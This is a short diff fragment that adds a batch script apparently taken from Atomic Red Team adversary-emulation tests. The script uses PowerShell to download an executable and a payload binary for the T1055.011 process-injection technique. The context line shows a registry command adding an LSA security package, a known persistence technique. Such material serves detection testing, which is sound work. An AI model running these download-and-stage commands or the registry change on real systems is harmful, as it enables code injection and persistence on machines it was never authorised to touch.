@@ -185,3 +185,17 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packag
 
 
 
+****
+
+@echo off
+
+mkdir "%exe_binary%" 2>nul
+
+
+powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe' -OutFile '%exe_binary%' -UseBasicParsing"
+
+
+powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin' -OutFile '%payload_file%' -UseBasicParsing"
+
+
+
